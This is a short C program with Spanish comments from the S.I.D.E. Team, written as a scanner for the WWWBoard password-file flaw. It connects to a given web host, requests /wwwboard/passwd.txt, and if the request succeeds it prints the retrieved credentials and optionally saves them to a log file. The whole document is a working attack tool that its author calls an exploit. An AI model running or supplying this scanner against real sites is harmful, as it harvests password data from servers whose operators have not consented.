
/* Pequenio Programejo que para lo unico que sirve es para facilitarle
   la búsqueda del passwd.txt del Bug del WWWBoard.
   Este Scanner, esta hecho para acompaniar al texto de UnderCode.
   Le agrege unas pelotudeces, como guardar el log y esas cosas.
   En un futuro proximo, voy a probar ponerle soporte para Scaneo de una
   Subred, o mejor, scaneo por host -l, aunque para esta boludez, no tiene
   mucho sentido
   Bueno! Saludos
_|_|_|_|   Zomba          _|_|_|_|
    _| zombaq@ciudad.com.ar   _|
  _|   www.colapsu2000.com  _|  
_|_|_|_| S.I.D.E. Team    _|_|_|_|
Linux User: #123703
Powered by: #61327 [SUSE 6.1]
Agradecimientos: A Todo S.I.D.E. (incluyendome) que se la RE BANCA!!
a UnderCode, Digitalrebel, a mi vieja que me esta mirando (VIEJA!! APAREZCO EN
UN EXPLOIT!!!, y a todos los que me conocen y me bancan...(no es cosa facil).
*/
    
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#define LOGFILE "claves.log"
main(int argc, char *argv[])
{
int sockfd;
struct sockaddr_in host;
struct hostent *he;
int port = 80;
FILE *fp;
char *cyan="\033[0;36m";
char *azul="\033[1;34m";
char *norm="\033[0;37m";
char *blanco="\033[1;37m";
char mostrar;
char *gets[4];
char getbuff[10000];
char *check;
gets[1] = "GET /wwwboard/passwd.txt HTTP/1.0\n\n";
system("clear");
printf("\t\tScanner de WWWBoard. Made by Zomba\n");
printf("\t\t%s^^^^^^^ ^^ ^^^^^^^^^ ^^^^ ^^ ^^^^^%s\n\n",azul,norm );           
     
if (argc != 2)
{
        printf("\nUso: %s [host]\n", argv[0]);
        exit(0);
}

if ((he=gethostbyname(argv[1])) == NULL)
{
        perror("getting hostname");
        exit(0);
}
sockfd=socket(AF_INET, SOCK_STREAM, 0);
bcopy(he->h_addr, (char *)&host.sin_addr, he->h_length); 
host.sin_family=AF_INET;
host.sin_port=htons(port);
if (connect(sockfd, (struct sockaddr*)&host, sizeof(host)) < 0)
{
        perror("connect");
}
printf("Conectado\n");
send(sockfd, gets[1],strlen(gets[1]),0);
recv(sockfd, getbuff, sizeof(getbuff),0);
check = strstr(getbuff,"200");
if(check != NULL)
{
        printf("%sWWWBoard encontrado!%s\nmuejeje manos a la obra :)\n", cyan,norm); 	printf("Desea ver el contenido de Passwd.txt? (S/N)"); 
	mostrar=getchar();
  	if(toupper(mostrar)=='S')
	    {
	    puts(getbuff);
	    }
	printf("Queres guardar el archivo en claves.log? (S/N)");
	scanf("%c", &mostrar); //LA PUTA MADRE!!!!!
	mostrar=getchar(); // No se xq mi compilador si saco
			   // alguno de estos dos, no me toma el getchar
			   // Me la quiere hacer Dificil :)    
 	if(toupper(mostrar)=='S')
	    {
	    fp=fopen(LOGFILE, "a");
	    fprintf(fp, "\n  #-#-#-#-#-#-#-#-#-#-#-#-#-#-#-# %s #-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#\n", argv[1]);
	    fputs(getbuff,fp);
	    fprintf(fp, "\n ** S.I.D.E. Team www.colapsu2000.com ** \n");
	    close(fp);
	        
	    }

}

else
{
        printf("WWWBoard no encontrado\nLa proxima sera\n");
        close(sockfd);
        exit(0);
}
close(sockfd);

printf("\n%sS.%sI.D.%sE.%s Team www.colapsu2000.com (No te olvides)\n",azul,blanco,azul,norm); }